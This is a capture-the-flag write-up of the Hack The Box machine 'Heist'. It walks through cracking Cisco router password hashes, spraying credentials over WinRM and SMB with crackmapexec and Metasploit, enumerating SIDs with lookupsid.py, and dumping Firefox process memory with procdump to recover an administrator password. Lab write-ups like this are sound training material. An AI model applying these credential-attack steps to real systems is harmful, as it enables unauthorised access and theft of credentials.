---
"title": "Hack The Box - Heist"
"date": 2020-04-25
"tags": ["windows", "easy", "lookupsid", "crackmapexec", "cisco", "procdump"]
"keywords": ["windows", "easy", "lookupsid", "crackmapexec", "cisco", "procdump"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---

![24d9ca73b43b839893a428dc54c3684b.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/7041ed2b227e43deb3e5a917934a810d.png)


We are going to pwn Heist from Hack The Box.

Link: [https://www.hackthebox.eu/home/machines/profile/201](https://www.hackthebox.eu/home/machines/profile/201)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT      STATE    SERVICE       VERSION
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open     msrpc         Microsoft Windows RPC
445/tcp   open     microsoft-ds?
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp filtered unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m35s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-25T04:10:48
|_  start_date: N/A
```

## SMB Enumeration

Anonymous login is not working in smb.
```bash
root@w0lf:~# smbclient -L 10.10.10.149
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
```

## HTTP Enumeration

Its an login form and however there is a option to quest login.
![db8bd395822f2861e0b8d6da3b508f54.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/727a88ce45ed489cb1b93d300044e83b.png)

After `Guest` login I received an Issues page and a person called `Hazard` reported his problem, about Cisco router and he also attached his configuration file here.[br/](br/)
![7b07ea5099d0ee998906a1c0cad2b8f3.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/7b724635b5634b6385eefbd601fde2d8.png)

While checking the Attachment file, it contains some username and hashes.[br/](br/)
![e27a1ce3b5022c97ced3bd7862d2776c.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/d8df2ed7fbca4067aae3fa2d4932e8db.png)

So I google about Cisco Router Password. And found this
![0173742235da9abea6e843537681868b.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/c8358f9286f24683b78d7c45d34deacc.png)
Since we have two type 7 passwords, I Searched for online crackers and got this.
> https://www.ifm.net.nz/cookbooks/passwordcracker.html

### Type 7
`username rout3r password 7 0242114B0E143F015F5D1E161713`[br/](br/)
![2b9f952efd4023ade8955f4e4154521f.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/7cf02f2fabcb4fb48851704a443d4452.png)


`username admin privilege 15 password 7 02375012182C1A1D751618034F36415408`[br/](br/)
![84a3a7a6b33a8bb245c7cd053eb63a53.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/10eaa883d836401cb911dcae71cc8e31.png)

### Type 5
```bash
root@w0lf:~/CTF/HTB/Boxes/Heist# cat john.hash 
$1$pdQG$o8nrSzsGXeaduXrjlvKc91

root@w0lf:~/CTF/HTB/Boxes/Heist# john john.hash  --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)
1g 0:00:00:54 DONE (2020-04-25 10:09) 0.01848g/s 64792p/s 64792c/s 64792C/s stealthy001..stcroix85
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@w0lf:~/CTF/HTB/Boxes/Heist# john john.hash --show
?:stealth1agent

1 password hash cracked, 0 left
```
So far we found `admin`, `hazard` and `rout3r` usernames and `stealth1agent`, `$uperP@ssword`, `Q4)sJu\Y8qz*A3?d` passwords. 

With them I created a small wordlist.
```bash
root@w0lf:~/CTF/HTB/Boxes/Heist#  cat user.txt 
hazard
rout3r
admin
root@w0lf:~/CTF/HTB/Boxes/Heist# cat password.txt 
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d
```

We know port `5985` is open so I bruteforce winrm using `crackmapexec`
```bash
root@w0lf:~/CTF/HTB/Boxes/Heist# crackmapexec winrm 10.10.10.149 -u user.txt -p password.txt 
WINRM       10.10.10.149    5985   NONE             [*] http://10.10.10.149:5985/wsman
WINRM       10.10.10.149    5985   NONE             [-] None\hazard:stealth1agent "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\hazard:$uperP@ssword "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\hazard:Q4)sJu\Y8qz*A3?d "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\rout3r:stealth1agent "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\rout3r:$uperP@ssword "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\rout3r:Q4)sJu\Y8qz*A3?d "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\admin:stealth1agent "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\admin:$uperP@ssword "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\admin:Q4)sJu\Y8qz*A3?d "the specified credentials were rejected by the server"
```
Nothing worked.

Let's try SMB Bruteforce using Metasploit module `use auxiliary/scanner/smb/smb_login`

```bash
msf5 auxiliary(scanner/smb/smb_login) > run

[*] 10.10.10.149:445      - 10.10.10.149:445 - Starting SMB login bruteforce
[+] 10.10.10.149:445      - 10.10.10.149:445 - Success: '.\hazard:stealth1agent'
[!] 10.10.10.149:445      - No active DB -- Credential data will not be saved!
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:stealth1agent',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:$uperP@ssword',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\rout3r:Q4)sJu\Y8qz*A3?d',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:stealth1agent',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:$uperP@ssword',
[-] 10.10.10.149:445      - 10.10.10.149:445 - Failed: '.\admin:Q4)sJu\Y8qz*A3?d',
[*] 10.10.10.149:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
We got one success let's login and check whats inside.
```bash
root@w0lf:~/CTF/HTB/Boxes/Heist# smbclient -L 10.10.10.149 -U hazard
Enter WORKGROUP\hazard's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```
Nothing useful again.

We can use a tool from `Impackets` called `lookupsid.py`
> lookupsid.py: A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface, aiming at finding remote users/groups.

```bash
root@w0lf:/opt/impacket-impacket_0_9_20/examples# python lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```
And we got some new users, I added them to my `user.txt`, Now run `crackmapexec` again.

## Getting User Shell

This time I get `Access Denied` while trying `Chase:Q4)sJu\Y8qz*A3?d`, So Let's try login with them.
```bash
root@w0lf:~/CTF/HTB/Boxes/Heist# crackmapexec winrm 10.10.10.149 -u user.txt -p password.txt 
WINRM       10.10.10.149    5985   NONE             [*] http://10.10.10.149:5985/wsman
WINRM       10.10.10.149    5985   NONE             [-] None\Chase:stealth1agent "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\Chase:$uperP@ssword "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\hazard:Q4)sJu\Y8qz*A3?d "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\hazard:stealth1agent "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\hazard:$uperP@ssword "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\rout3r:Q4)sJu\Y8qz*A3?d "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\rout3r:stealth1agent "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\rout3r:$uperP@ssword "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\admin:Q4)sJu\Y8qz*A3?d "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\admin:stealth1agent "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\admin:$uperP@ssword "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\support:Q4)sJu\Y8qz*A3?d "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\support:stealth1agent "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\support:$uperP@ssword "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\Jason:Q4)sJu\Y8qz*A3?d "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\Jason:stealth1agent "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\Jason:$uperP@ssword "the specified credentials were rejected by the server"
WINRM       10.10.10.149    5985   NONE             [-] None\Chase:Q4)sJu\Y8qz*A3?d "Access is denied.  (extended fault data: {'transport_message': 'Bad HTTP response returned from server. Code 500', 'http_status_code': 500, 'wsmanfault_code': '5', 'fault_code': 's:Sender', 'fault_subcode': 'w:AccessDenied'})"
```

Logged in as Chase.[br/](br/)
![1f827bc46da7ae8166a5eaa4d0d2e63d.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/a300ea1ca46a4511a24006ea75412340.png)

## Privilege Escalation

While enumerating I found `Firefox` is installed which is odd.[br/](br/)
![img.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/fa28e271fa824f7cbdf258c4929df8cd.png)

Let's check whether its running? Yes `Firefox` is running.[br/](br/)
![e2b5342d10bc1dbd805f4050777352c5.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/6162aa5639be416babb93c56257f8771.png)

We can dump these processes using `procdump.exe`. We can download it from [here](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump).

If we run that `procdump.exe` it asks me to accept EULA first.
```
This is the first run of this program. You must accept EULA to continue.
Use -accepteula to accept EULA.
```

So by running `.\procdump64.exe -accepteula` we accepted that. Now its time to dump the process.
```bash
*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64.exe -ma 4276

ProcDump v9.0 - Sysinternals process dump utility
Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[12:18:00] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_200425_121800.dmp
[12:18:01] Dump 1 writing: Estimated dump file size is 281 MB.
[12:18:07] Dump 1 complete: 281 MB written in 7.1 seconds
[12:18:08] Dump count reached.

*Evil-WinRM* PS C:\Users\Chase\Documents> 
```


> -ma     Write a 'Full' dump file.
  				Includes All the Image, Mapped and Private memory.

> 4276 	Firefox ID which I got from ps


Download that file to my machine. It takes some time because the file size is 281mb.
```bash
*Evil-WinRM* PS C:\Users\Chase\Documents> ls


    Directory: C:\Users\Chase\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/25/2020  12:18 PM      286846903 firefox.exe_200425_121800.dmp
-a----        4/25/2020  12:09 PM         341672 procdump64.exe


*Evil-WinRM* PS C:\Users\Chase\Documents> download firefox.exe_200425_121800.dmp
Info: Downloading C:\Users\Chase\Documents\firefox.exe_200425_121800.dmp to firefox.exe_200425_121800.dmp
```

While running that in background, I did `strings` on that to find any password available.
```bash
root@w0lf:~/hacking-tools/evil-winrm# strings firefox.exe_200425_121800.dmp | grep password
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```
It looks like admin password so try login with them.

`administrator : 4dD!5}x/re8]FBuZ`[br/](br/)
![cd9776083dc7761c1590362976cb6840.png](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-heist/af015a897a024595810aa1d045756661.png)[br/](br/)
We own the Root!!

















